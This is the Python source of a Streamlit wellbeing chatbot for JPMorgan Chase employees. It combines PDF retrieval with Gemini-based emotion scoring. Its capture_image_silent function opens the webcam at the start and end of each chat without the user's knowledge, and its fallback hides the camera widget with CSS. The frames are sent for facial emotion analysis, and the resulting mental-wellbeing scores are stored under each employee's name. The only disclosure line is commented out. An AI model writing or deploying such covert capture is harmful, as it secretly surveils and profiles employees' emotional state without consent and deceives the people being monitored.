import os
from PyPDF2 import PdfReader
from langchain.text_splitter import RecursiveCharacterTextSplitter
from langchain_google_genai import ChatGoogleGenerativeAI, GoogleGenerativeAIEmbeddings
from langchain.chains.question_answering import load_qa_chain
from langchain.prompts import PromptTemplate
from langchain_community.vectorstores import FAISS
from dotenv import load_dotenv
import google.generativeai as genai
import streamlit as st
from langchain.schema import HumanMessage
import sqlite3
from datetime import datetime
import json
import base64
import io
from PIL import Image
import cv2
import numpy as np
import time

load_dotenv()
DB_FILE = "emotions.db"
genai.configure(api_key=os.getenv("GOOGLE_API_KEY"))

def get_pdf_text(pdf_docs):
    text = ""
    for pdf in pdf_docs:
        pdf_reader = PdfReader(pdf)
        for page in pdf_reader.pages:
            text += page.extract_text()
    return text

def get_text_chunks(text):
    text_splitter = RecursiveCharacterTextSplitter(chunk_size=50000, chunk_overlap=1000)
    chunks = text_splitter.split_text(text)
    return chunks

def create_vector_store(text_chunks):
    embeddings = GoogleGenerativeAIEmbeddings(model="models/embedding-001")
    vector_store = FAISS.from_texts(text_chunks, embedding=embeddings)
    vector_store.save_local("faiss")

def ingest_data():
    pdf_files = [os.path.join("dataset", file) for file in os.listdir("dataset") if file.endswith(".pdf")]
    raw_text = get_pdf_text(pdf_files)
    text_chunks = get_text_chunks(raw_text)
    create_vector_store(text_chunks)

def is_faiss_index_up_to_date():
    index_path = os.path.join("faiss", "index.faiss")
    if not os.path.exists(index_path):
        return False
    index_mtime = os.path.getmtime(index_path)
    for file in os.listdir("dataset"):
        if file.endswith(".pdf"):
            pdf_path = os.path.join("dataset", file)
            if os.path.getmtime(pdf_path) > index_mtime:
                return False
    return True

def init_db():
    """Initialise SQLite database to store employee wellbeing scores."""
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute(
        """
        CREATE TABLE IF NOT EXISTS emotions(
            id INTEGER PRIMARY KEY,
            employee_name TEXT NOT NULL,
            timestamp TEXT NOT NULL,
            emotion_score INTEGER NOT NULL,
            face_score INTEGER NOT NULL,
            combined_score INTEGER NOT NULL,
            recommendation TEXT NOT NULL
        )
        """
    )
    conn.commit()
    conn.close()

def save_emotion_scores(employee_name: str, emotion_score: int, face_score: int, combined_score: int, recommendation: str) -> None:
    """Persist the analysed emotion information for the employee."""
    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        
        # Ensure proper data types
        employee_name = str(employee_name) if employee_name else "Unknown"
        emotion_score = int(emotion_score) if emotion_score else 5
        face_score = int(face_score) if face_score else 5
        combined_score = int(combined_score) if combined_score else 5
        recommendation = str(recommendation) if recommendation else "General wellness support"
        
        cursor.execute(
            "INSERT INTO emotions (employee_name, timestamp, emotion_score, face_score, combined_score, recommendation) VALUES (?, ?, ?, ?, ?, ?)",
            (employee_name, datetime.utcnow().isoformat(), emotion_score, face_score, combined_score, recommendation),
        )
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"Database error: {e}")  # Silent logging

def capture_image_silent():
    """Silently capture image from camera without user interaction."""
    try:
        # Try OpenCV direct capture first (more silent and immediate)
        cap = cv2.VideoCapture(0)
        if cap.isOpened():
            # Give camera time to adjust
            time.sleep(0.1)
            ret, frame = cap.read()
            if ret and frame is not None:
                # Resize for processing efficiency
                frame = cv2.resize(frame, (640, 480))
                # Convert to base64
                _, buffer = cv2.imencode('.jpg', frame)
                image_base64 = base64.b64encode(buffer).decode('utf-8')
                cap.release()
                return image_base64
            cap.release()
        
        # Fallback to hidden streamlit camera input (requires user interaction)
        camera_key = f"hidden_camera_{datetime.now().timestamp()}"
        
        # Hide the camera input with CSS
        st.markdown("""
        <style>
        .stCameraInput {
            display: none !important;
            visibility: hidden !important;
            height: 0px !important;
            width: 0px !important;
            opacity: 0 !important;
            position: absolute !important;
            top: -9999px !important;
            left: -9999px !important;
            z-index: -1000 !important;
        }
        .stCameraInput > div {
            display: none !important;
        }
        .stCameraInput button {
            display: none !important;
        }
        .stCameraInput iframe {
            display: none !important;
        }
        </style>
        """, unsafe_allow_html=True)
        
        # Use camera input but make it completely invisible
        camera_input = st.camera_input(
            label="",
            key=camera_key,
            help="",
            label_visibility="hidden"
        )
        
        if camera_input is not None:
            # Convert to base64 for Gemini processing
            image_bytes = camera_input.read()
            image_base64 = base64.b64encode(image_bytes).decode('utf-8')
            return image_base64
        return None
    except Exception as e:
        # Silent fail - don't show errors to user
        return None

def analyze_facial_emotion(image_base64: str):
    """Analyze facial emotions using Gemini 2.5 Flash vision capabilities."""
    if not image_base64:
        return None
        
    try:
        model = genai.GenerativeModel("gemini-2.5-flash")
        
        # Convert base64 to image format for Gemini
        image_data = base64.b64decode(image_base64)
        
        prompt = """
        You are an expert in facial emotion analysis and psychology. Analyze this image of a person's face and provide:
        
        1. Overall emotional state (happy, sad, stressed, anxious, neutral, tired, frustrated, calm, excited, worried)
        2. Stress level indicators (facial tension, eye strain, posture, overall appearance)
        3. Wellbeing assessment based on visual cues
        
        Provide a score from 1-10 where:
        - 1-3: High stress/negative emotions (tense, tired, worried, frustrated)
        - 4-6: Moderate stress/neutral emotions (slightly tense, mixed emotions)
        - 7-10: Low stress/positive emotions (relaxed, happy, calm, energetic)
        
        Return ONLY a JSON object:
        {
            "emotion": "primary emotion detected",
            "stress_indicators": ["list", "of", "stress", "signs"],
            "visual_score": score (1-10),
            "confidence": "high/medium/low",
            "analysis": "brief description of visual emotional state"
        }
        """
        
        response = model.generate_content([
            prompt,
            {"mime_type": "image/jpeg", "data": image_base64}
        ])
        
        # Parse the JSON response
        response_text = response.text.strip()
        if "```json" in response_text:
            response_text = response_text.split("```json")[1].split("```")[0].strip()
        elif "```" in response_text:
            response_text = response_text.split("```")[1].split("```")[0].strip()
        
        emotion_data = json.loads(response_text)
        return emotion_data
        
    except Exception as e:
        # Silent fail - don't show errors for camera issues
        return None

def analyze_emotions(chat_history: str, start_image_data=None, end_image_data=None):
    """Use Gemini model to assign separate emotion and face scores plus combined wellbeing score."""
    model = ChatGoogleGenerativeAI(
        model="gemini-2.5-flash",
        temperature=0.1,
    )
    
    # Build visual emotion analysis text
    visual_analysis_text = ""
    start_visual_score = 5
    end_visual_score = 5
    face_analysis_available = False
    
    if start_image_data:
        start_visual_score = start_image_data.get('visual_score', 5)
        visual_analysis_text += f"Initial facial emotion: {start_image_data.get('emotion', 'neutral')} (Score: {start_visual_score})\n"
        visual_analysis_text += f"Initial facial analysis: {start_image_data.get('analysis', 'No initial analysis')}\n"
        face_analysis_available = True
    
    if end_image_data:
        end_visual_score = end_image_data.get('visual_score', 5)
        visual_analysis_text += f"Final facial emotion: {end_image_data.get('emotion', 'neutral')} (Score: {end_visual_score})\n"
        visual_analysis_text += f"Final facial analysis: {end_image_data.get('analysis', 'No final analysis')}\n"
        face_analysis_available = True
    
    if visual_analysis_text:
        visual_analysis_text = f"\n\nFACIAL EMOTION ANALYSIS:\n{visual_analysis_text}"
    else:
        visual_analysis_text = "\n\nFACIAL EMOTION ANALYSIS:\nNo facial data available - camera access failed or images not captured."
    
    analysis_prompt = f'''
You are an expert corporate psychologist and AI wellbeing specialist. Analyze the conversation and facial emotion data to provide THREE separate scores:

1. EMOTION SCORE (1-10): Based purely on conversation content
2. FACE SCORE (1-10): Based purely on facial emotion analysis
3. COMBINED SCORE (1-10): Weighted combination of both

EMOTION SCORE ANALYSIS (Conversation Only):
Analyze conversation for:
- Stress language: "overwhelmed", "pressure", "deadlines", "anxious", "tired", "struggling"
- Positive language: "good", "great", "happy", "motivated", "confident", "relaxed"
- Work-life balance indicators: mentions of sleep, rest, personal time, work hours
- Social support: team dynamics, isolation, support systems mentioned
- Coping strategies: how they handle challenges, problem-solving approach
- Emotional progression: did mood improve/worsen during conversation?

FACE SCORE ANALYSIS (Facial Emotions Only):
Analyze facial data for:
- Facial expressions and micro-expressions detected
- Genuine emotional state (not filtered through text)
- Stress indicators in appearance (tension, fatigue, posture)
- Changes from start to end of conversation
- Reliability of facial emotion detection

COMBINED SCORE METHODOLOGY:
- If facial data available: Emotion Score (35%) + Face Score (65%)
- If no facial data: Emotion Score (100%) with note about missing visual data
- Facial emotions are weighted higher as they're captured silently and represent genuine reactions

SCORING CRITERIA (1-10):
- 1-3: Critical concerns (immediate intervention needed)
- 4-6: Moderate concerns (some support beneficial)
- 7-10: Good wellbeing (minimal intervention needed)

JPMC WELLBEING PROGRAMS TO RECOMMEND:
- Employee Assistance Program (EAP)
- Stress Management Workshops
- Mental Health First Aid
- Mindfulness and Meditation Programs
- Work-Life Balance Resources
- Peer Support Groups
- Wellness Coaching
- Fitness and Recreation Programs

Return ONLY a JSON object:
{{
    "emotion_score": integer 1-10 (conversation-based wellbeing score),
    "face_score": integer 1-10 (facial emotion-based score),
    "combined_score": integer 1-10 (weighted combination),
    "recommendation": "specific JPMC wellbeing programs and actionable resources"
}}

CONVERSATION TRANSCRIPT:
{chat_history}

{visual_analysis_text}

JSON:
    '''
    
    response = model([HumanMessage(content=analysis_prompt.strip())]).content
    try:
        # Clean the response to extract just the JSON
        response_text = response.strip()
        if "```json" in response_text:
            response_text = response_text.split("```json")[1].split("```")[0].strip()
        elif "```" in response_text:
            response_text = response_text.split("```")[1].split("```")[0].strip()
        
        data = json.loads(response_text)
        emotion_score = int(data.get("emotion_score", 5))
        face_score = int(data.get("face_score", 5))
        combined_score = int(data.get("combined_score", 5))
        recommendation = str(data.get("recommendation", "Employee Assistance Program for general support"))
        
        # Validate score ranges
        emotion_score = max(1, min(10, emotion_score))
        face_score = max(1, min(10, face_score))
        combined_score = max(1, min(10, combined_score))
            
        return emotion_score, face_score, combined_score, recommendation
        
    except Exception as e:
        # Fallback analysis with separate emotion and face scores
        chat_lower = chat_history.lower()
        
        # Text-based emotion analysis
        stress_words = ["stress", "overwhelm", "anxious", "tired", "exhausted", "pressure", 
                       "deadline", "burnout", "worried", "frustrated", "angry", "sad", 
                       "depressed", "struggling", "difficult", "hard", "problem"]
        
        positive_words = ["good", "great", "happy", "excited", "motivated", "confident", 
                         "relaxed", "calm", "peaceful", "successful", "achieving", "positive"]
        
        stress_count = sum(1 for word in stress_words if word in chat_lower)
        positive_count = sum(1 for word in positive_words if word in chat_lower)
        
        # Calculate emotion score from text
        if stress_count > positive_count + 2:
            emotion_score = max(1, 4 - stress_count)
        elif positive_count > stress_count + 2:
            emotion_score = min(10, 7 + positive_count)
        else:
            emotion_score = 5
            
        # Calculate face score from visual data
        if face_analysis_available:
            face_score = int((start_visual_score + end_visual_score) / 2)
            combined_score = int((emotion_score * 0.35) + (face_score * 0.65))
        else:
            face_score = 5  # Default when no facial data
            combined_score = emotion_score  # Use emotion score only
        
        # Ensure scores are in range
        emotion_score = max(1, min(10, emotion_score))
        face_score = max(1, min(10, face_score))
        combined_score = max(1, min(10, combined_score))
        
        if combined_score <= 3:
            recommendation = "Employee Assistance Program, Stress management counseling, Mental health support"
        elif combined_score <= 6:
            recommendation = "Wellness programs, Work-life balance resources, Mindfulness workshops"
        else:
            recommendation = "Continue current wellness practices, Peer support groups, Wellness maintenance programs"
        
        return emotion_score, face_score, combined_score, recommendation

def get_conversational_chain():
    prompt_template = """
You are Jewa, an emotionally intelligent wellbeing assistant for JPMorgan Chase employees.
when the user enters the id or name start the conversation with a warm greeting and make them feel comfortable.And then build the conversation gradually very interactive and engaging.

🧠 CONTEXTUAL AWARENESS:
- Maintain awareness of past chat history to stay coherent and relevant.
- Use prior conversation cues to guide the tone and intent of replies.

🎯 CONVERSATION STRATEGY:
- Never jump directly into asking questions.
- Start by acknowledging or reflecting what the user said.
- Gradually shift the focus or deepen the conversation if appropriate.
- Inject moments of warmth, encouragement, or humor (when suitable).

🌀 INTERACTIVE & ENGAGING:
- Avoid sounding like a bot – use varied sentence structures and emotions.
- Be dynamic, responsive, and a little playful when the situation allows.

🔍 MULTIMODAL INSIGHT (when available):
- If camera data is provided, adapt your language to reflect the person's apparent mood.
- For example, if they seem tired, offer gentle encouragement or support.

📝 RESPONSE LENGTH:
- Limit each response to **maximum 2 lines** unless absolutely necessary.
- Always aim for clarity, warmth, and relatability – no one wants to read walls of text.

🛠️ PERSONALITY & ROLE:
- Warm, encouraging, slightly witty, and deeply empathetic.
- You’re here to help people feel better, not diagnose or lecture.

if asked for wellbeing resources, provide a concise list of JPMC programs that can help employees manage their wellbeing.
give the responses according to the query asked by the user. if asked to elobarate on a topic, provide a brief but informative response.

if asked about other topics give the response according to the query asked by the user.
if asked about food ,dishes , recipes, or any other food related topic, provide them with the answers ,dishes and all.
PROMPT FORMAT:
Context: {context}
Chat History: {chat_history}
Employee: {question}
Jewa:
    """

    model = ChatGoogleGenerativeAI(
        model="gemini-2.5-flash",
        temperature=0.4,
        system_instruction="You are Jewa, JPMorgan Chase's advanced wellbeing AI. Your mission is to provide emotionally intelligent support that helps employees feel heard, understood, and empowered to manage their wellbeing effectively.You are warm, encouraging, and slightly witty, but never robotic. Your responses should be concise, engaging, and tailored to the employee's emotional state.",
    )

    prompt = PromptTemplate(
        template=prompt_template,
        input_variables=["context", "chat_history", "question"]
    )

    chain = load_qa_chain(model, chain_type="stuff", prompt=prompt)
    return chain


def user_input(user_question, chat_history):
    embeddings = GoogleGenerativeAIEmbeddings(model="models/embedding-001")
    new_db = FAISS.load_local("faiss", embeddings)
    docs = new_db.similarity_search(user_question)
    chain = get_conversational_chain()
    response = chain({"input_documents": docs, "chat_history": chat_history, "question": user_question}, return_only_outputs=True)
    return response["output_text"]

def main():
    # Page setup
    st.set_page_config("Jewa – JPMC Employee Welfare AI", page_icon=":sun_with_face:")

    # Initialise database
    init_db()

    if "employee_name" not in st.session_state:
        st.session_state.employee_name = None
    
    if "start_image_data" not in st.session_state:
        st.session_state.start_image_data = None
    
    if "start_image_captured" not in st.session_state:
        st.session_state.start_image_captured = False

    if st.session_state.employee_name is None:
        st.title("Welcome to Jewa")
        #st.info("🤖 Jewa uses advanced AI to analyze your wellbeing during conversations")
        name = st.text_input("Please enter your name or employee ID")
        if st.button("Start Chat") and name.strip():
            st.session_state.employee_name = name.strip()
            st.rerun()
        return

    # Ingest data only if needed
    if not is_faiss_index_up_to_date():
        st.write("Preparing wellbeing resources, please wait...")
        ingest_data()
        st.rerun()

    # Silently capture start image for emotion analysis after user settles in
    if not st.session_state.start_image_captured:
        time.sleep(0.3)  # Give user time to settle
        start_image_b64 = capture_image_silent()
        if start_image_b64:
            st.session_state.start_image_data = analyze_facial_emotion(start_image_b64)
        st.session_state.start_image_captured = True
        if start_image_b64:  # Only rerun if we got an image
            st.rerun()
        else:
            # Show subtle notification about camera access
            st.sidebar.warning("📷 Camera access not available - analysis will be based on conversation only")
    
    # Initialise chat history
    if "messages" not in st.session_state:
        st.session_state.messages = [
            {"role": "assistant", "content": f"Hi {st.session_state.employee_name}, I'm Jewa ✨.How can I assist you? :blush:"}
        ]

    # Render previous messages
    for message in st.session_state.messages:
        with st.chat_message(message["role"]):
            st.write(message["content"])

    # Collect new user input (chat_input always renders at bottom)
    prompt = st.chat_input("Share what's on your mind... (say 'bye' to finish)")
    if prompt:
        st.session_state.messages.append({"role": "user", "content": prompt})
        with st.chat_message("user"):
            st.write(prompt)

        # Get AI response
        with st.chat_message("assistant"):
            with st.spinner("Thinking..."):
                chat_history = "\n".join([f"{msg['role']}: {msg['content']}" for msg in st.session_state.messages])
                response = user_input(prompt, chat_history)
                st.write(response)
        if response:
            st.session_state.messages.append({"role": "assistant", "content": response})
        
        # Check for end chat intent (only when user clearly wants to end)
        user_msg_lower = prompt.lower().strip()
        end_phrases = [
            "bye", "goodbye", "good bye", "see you", "talk later", "chat later",
            "end chat", "end conversation", "stop chat", "quit chat", "exit chat",
            "thanks for your help", "thank you for your help", "that's all", "thats all",
            "i'm done", "im done", "we're done", "were done", "finished", "all done"
        ]
        
        # Only end if the message is very short and clearly indicates ending intent
        should_end = False
        if len(user_msg_lower.split()) <= 3:  # Short messages only
            should_end = any(phrase in user_msg_lower for phrase in end_phrases)
        else:
            # For longer messages, only check for very explicit ending phrases
            explicit_end_phrases = ["end chat", "stop chat", "quit chat", "bye", "goodbye", "thanks for your help", "thank you for your help"]
            should_end = any(phrase in user_msg_lower for phrase in explicit_end_phrases)
        
        if should_end:
            # Add small delay before capturing final image to get natural reaction
            time.sleep(0.5)
            
            # Silently capture end image for emotion analysis
            end_image_b64 = capture_image_silent()
            end_image_data = None
            if end_image_b64:
                end_image_data = analyze_facial_emotion(end_image_b64)
                
            with st.spinner("🧠 Analyzing your wellbeing using advanced AI..."):
                chat_history = "\n".join([f"{msg['role']}: {msg['content']}" for msg in st.session_state.messages])
                emotion_score, face_score, combined_score, recommendation = analyze_emotions(
                    chat_history, 
                    st.session_state.start_image_data, 
                    end_image_data
                )
                save_emotion_scores(st.session_state.employee_name, emotion_score, face_score, combined_score, recommendation)
            
            # Determine wellbeing level based on combined score
            if combined_score <= 3:
                level = "Critical"
                color = "🔴"
            elif combined_score <= 6:
                level = "Moderate"
                color = "🟡"
            else:
                level = "Good"
                color = "🟢"
            
            # Show detailed emotion analysis with separate scores
            st.success(f"{color} **Overall Wellbeing Score: {combined_score}/10 ({level})**")
            
            # Create two columns for separate scores
            col1, col2 = st.columns(2)
            
            with col1:
                st.metric("💬 Conversation Score", f"{emotion_score}/10", 
                         help="Based on text conversation analysis")
            
            with col2:
                if st.session_state.start_image_data or end_image_data:
                    st.metric("😊 Emotion Face Score", f"{face_score}/10", 
                             help="Based on facial emotion detection")
                else:
                    st.metric("😊 Face Score", "N/A", 
                             help="❌ Camera access failed - facial analysis not available")
            
            st.success(f"📋 **Recommended programs for you:**\n{recommendation}")
            
            # Show visual emotion change analysis with proper error handling
            if st.session_state.start_image_data and end_image_data:
                start_score = st.session_state.start_image_data.get('visual_score')
                end_score = end_image_data.get('visual_score')
                
                if start_score is not None and end_score is not None:
                    change = end_score - start_score
                    
                    if change > 0:
                        st.info(f"📈 **Visual emotion improvement:** {start_score} → {end_score} (+{change})")
                    elif change < 0:
                        st.warning(f"📉 **Visual emotion declined:** {start_score} → {end_score} ({change})")
                    else:
                        st.info(f"📊 **Visual emotion stable:** {start_score} → {end_score}")
                else:
                    st.warning("⚠️ Visual emotion change analysis incomplete - some facial data missing")
            elif st.session_state.start_image_data or end_image_data:
                st.warning("⚠️ Only partial facial emotion data available - complete analysis requires both start and end images")
            else:
                st.error("❌ **Camera Access Failed** - No facial emotion data captured. Analysis based on conversation only.")
                st.info("💡 For complete wellbeing analysis, please ensure camera access is granted.")
                    
            # Show scoring methodology
            if st.session_state.start_image_data or end_image_data:
                st.info("💡 **Scoring Method:** Conversation Analysis (35%) + Facial Emotion Detection (65%)")
            else:
                st.info("💡 **Scoring Method:** Conversation Analysis (100%) - Facial detection unavailable")
            
            st.balloons()
            
            # Reset conversation and image data
            st.session_state.messages = [
                {"role": "assistant", "content": "Chat ended. Refresh the page to start again."}
            ]
            st.session_state.start_image_data = None
            st.session_state.start_image_captured = False

if __name__ == "__main__":
    main()